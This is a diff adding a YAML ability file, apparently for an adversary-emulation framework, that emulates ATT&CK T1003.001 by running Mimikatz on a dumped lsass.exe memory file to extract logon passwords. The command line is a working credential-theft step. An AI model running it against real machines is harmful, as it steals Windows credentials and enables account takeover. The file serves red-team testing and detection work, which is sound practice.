@@ -1,0 +1,21 @@
+---
+- id: 8d819da23da34ac5921c18f0a603341f
+  name: Offline Credential Theft With Mimikatz
+  description: 'The memory of lsass.exe is often dumped for offline credential theft
+    attacks. Adversaries commonly perform this offline analysis with
+
+    Mimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and
+    can be obtained using the get-prereq_commands.
+
+    '
+  tactic: credential-access
+  technique:
+    attack_id: T1003.001
+    name: 'OS Credential Dumping: LSASS Memory'
+  platforms:
+    windows:
+      cmd:
+        command: PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe "sekurlsa::minidump
+          %tmp%\lsass.DMP" "sekurlsa::logonpasswords full" exit
+        payloads: []
+        cleanup: ''
